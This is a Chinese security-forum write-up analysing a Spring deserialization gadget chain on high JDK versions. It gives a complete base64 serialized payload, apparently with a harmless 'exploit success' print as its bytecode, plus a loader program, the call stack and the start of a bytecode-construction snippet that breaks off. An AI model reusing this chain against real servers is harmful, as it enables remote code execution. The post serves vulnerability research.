---
title: 高版本jdk下的spring通杀链
url: https://forum.butian.net/share/4576
source: 奇安信攻防社区
date: 2026-01-30
fetch_date: 2026-01-31T04:00:22.355521
---

# 高版本jdk下的spring通杀链

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 高版本jdk下的spring通杀链

* [漏洞分析](https://forum.butian.net/topic/48)

jsjcw师傅提出的一条链子。只给了一个payload，然后这里来分析一下过程。

高版本spring通杀链
============
### 简单分析
我这里是直接搭了一个springboot3环境来进行分析，然后在TemplatesImpl的getOutputProperties()方法打一个断点，在jdk17的环境下简单看了一下调用栈：
```java
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Base64;
public class Main {
public static void main(String[] args) throws Exception {
String base64Data = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3EAfgAAP0AAAAAAAAx3CAAAABAAAAACdAACYWFzcgAsY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuUE9KT05vZGUAAAAAAAAAAgIAAUwABl92YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuSmRrRHluYW1pY0FvcFByb3h5TMS0cQ7rlvwCAARaAA1lcXVhbHNEZWZpbmVkWgAPaGFzaENvZGVEZWZpbmVkTAAHYWR2aXNlZHQAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNlZFN1cHBvcnQ7WwARcHJveGllZEludGVyZmFjZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cAAAc3IAMG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkU3VwcG9ydCTLijz6pMV1AgAFWgALcHJlRmlsdGVyZWRMABNhZHZpc29yQ2hhaW5GYWN0b3J5dAA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc29yQ2hhaW5GYWN0b3J5O0wACGFkdmlzb3JzdAAQTGphdmEvdXRpbC9MaXN0O0wACmludGVyZmFjZXNxAH4AE0wADHRhcmdldFNvdXJjZXQAJkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9UYXJnZXRTb3VyY2U7eHIALW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5Qcm94eUNvbmZpZ4tL8+an4PdvAgAFWgALZXhwb3NlUHJveHlaAAZmcm96ZW5aAAZvcGFxdWVaAAhvcHRpbWl6ZVoAEHByb3h5VGFyZ2V0Q2xhc3N4cAAAAAAAAHNyADxvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuRGVmYXVsdEFkdmlzb3JDaGFpbkZhY3RvcnlU3WQ34k5x9wIAAHhwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4c3EAfgAZAAAAAXcEAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB4c3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5TaW5nbGV0b25UYXJnZXRTb3VyY2V9VW71x/j6ugIAAUwABnRhcmdldHEAfgAFeHBzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAPTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAArvK/rq+AAAAMgAsAQAEVGVzdAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxUZXN0OwwABQAGCgAEAAwBAANwcnQBABBqYXZhL2xhbmcvU3lzdGVtBwAPAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07DAARABIJABAAEwEABGRhdGEBABJMamF2YS9sYW5nL1N0cmluZzsMABUAFgkAAgAXAQATamF2YS9pby9QcmludFN0cmVhbQcAGQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMABsAHAoAGgAdAQAIPGNsaW5pdD4BAEUqKioqKioqKioqKioqKioqKioqKioqKioqKiBleHBsb2l0IHN1Y2Nlc3MgKioqKioqKioqKioqKioqKioqKioqKioqKioIACAMAA4ABgoAAgAiAQAKU291cmNlRmlsZQEAC0V4cE9iai5qYXZhAQAMSW5uZXJDbGFzc2VzAQAYamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyBwAnAQAQamF2YS91dGlsL0Jhc2U2NAcAKQEAB0RlY29kZXIAIQACAAQAAAABAAoAFQAWAAAAAwABAAUABgABAAcAAAAvAAEAAQAAAAUqtwANsQAAAAIACAAAAAYAAQAAABYACQAAAAwAAQAAAAUACgALAAAACgAOAAYAAQAHAAAAJgACAAAAAAAKsgAUsgAYtgAesQAAAAEACAAAAAoAAgAAAJgACQCZAAgAHwAGAAEABwAAABYAAQAAAAAAChMAIbMAGLgAI7EAAAAAAAIAJAAAAAIAJQAmAAAACgABACgAKgArAAl1cQB+ACcAAACayv66vgAAADcADAEABVRlc3QyBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAApUZXN0Mi5qYXZhAQAGPGluaXQ+AQADKClWDAAHAAgKAAQACQEABENvZGUAIQACAAQAAAAAAAEAAQAHAAgAAQALAAAAEQABAAEAAAAFKrcACrEAAAAAAAEABQAAAAIABnB0AAR0ZXN0cHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAARxAH4AHXZyACNvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5TcHJpbmdQcm94eQAAAAAAAAAAAAAAeHB2cgApb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkFkdmlzZWQAAAAAAAAAAAAAAHhwdnIAKG9yZy5zcHJpbmdmcmFtZXdvcmsuY29yZS5EZWNvcmF0aW5nUHJveHkAAAAAAAAAAAAAAHhwdAACYkJzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB+AAV4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB4c3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcQB+AAA/QAAAAAAADHcIAAAAEAAAAAJxAH4AA3EAfgA4cQB+ADNxAH4ACHhxAH4APHg=";
byte[] data = Base64.getDecoder().decode(base64Data);
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
Object obj = ois.readObject();
ois.close();
}
}
```
关键调用栈如下：
```php
getOutputProperties:608, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:77, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
invoke:568, Method (java.lang.reflect)
invokeJoinpointUsingReflection:344, AopUtils (org.springframework.aop.support)
invoke:208, JdkDynamicAopProxy (org.springframework.aop.framework)
getOutputProperties:-1, $Proxy0 (jdk.proxy1)
invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:77, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
invoke:568, Method (java.lang.reflect)
serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)
serialize:115, POJONode (com.fasterxml.jackson.databind.node)
serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
\_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)
\_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)
writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)
nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)
toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node)
equals:391, XString (com.sun.org.apache.xpath.internal.objects)
equals:492, AbstractMap (java.util)
putVal:633, HashMap (java.util)
readObject:1553, HashMap (java.util)
```
可以看出来起点是HashMap+XString调用toString，\*\*这里需要注意一个点\*\*，我们前面链子中都是用的BadAttributeValueExpException作为入口点，但是在jdk17这里修改了这个类的readObject()方法：
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-4f6df5db1e6f6d86651c2dba164a60685458a54f.png)
导致无法在反序列化时调用到toString()方法，所以需要找另外的入口，这里用的HasdhMap+XString就不多说了，非常常见了。
然后根据调用栈来看过程，看起来其实很像之前学过的jackson链不稳定性解决方法的链子，是直接打的动态加载字节码，从而rce。
### 高版本的加载字节码的限制以及拓展利用
#### 从零分析
我们这里从零开始分析一下jdk17下的"原"TemplatesImpl的rce方法的，基本思路和我们前面学习的动态加载字节码的过程是一样的，可以构造代码如下：
```java
import javassist.\*;
import sun.misc.Unsafe;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
public cl...